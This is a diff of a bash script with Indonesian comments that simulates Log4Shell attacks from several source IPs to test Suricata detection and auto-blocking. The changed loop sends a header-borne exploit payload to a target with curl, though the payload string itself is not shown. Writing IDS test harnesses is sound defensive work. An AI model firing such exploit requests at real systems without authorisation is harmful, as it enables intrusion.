@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env bash
+#!/usr/bin/env bash
 # =============================================================================
 #  attack_sim.sh — Simulasi Serangan Multi-IP untuk Menguji Suricata
 #  Author  : Levi (github.com/LEVI6957)
@@ -90,16 +90,13 @@ for i in $(seq 0 $((IP_COUNT - 1))); do
 
     echo -ne "${RED}[ATK]${NC} Log4Shell dari ${BOLD}${SRC_IP}${NC} (Kirim 3x)...\r"
     
-    # Kirim 3 request beruntun dari IP yang sama untuk melebihi threshold auto-block
+    # Kirim 3 request berurutan (tanpa background agar lebih terkontrol)
     for hit in {1..3}; do
-        curl -s --max-time 1 --connect-timeout 1 \
+        curl -s --max-time 2 --connect-timeout 2 \
             --interface "$SRC_IP" \
             -H "${HDR}: ${PAYLOAD}" \
-            "${TARGET}/" -o /dev/null 2>/dev/null &
+            "${TARGET}/" -o /dev/null 2>/dev/null
     done
-    
-    # Wait for all curl background jobs for this IP to finish
-    wait 
     echo -e "${RED}[ATK]${NC} Log4Shell dari ${BOLD}${SRC_IP}${NC} (Kirim 3x) -> Selesai."
     
     sleep "$DELAY"
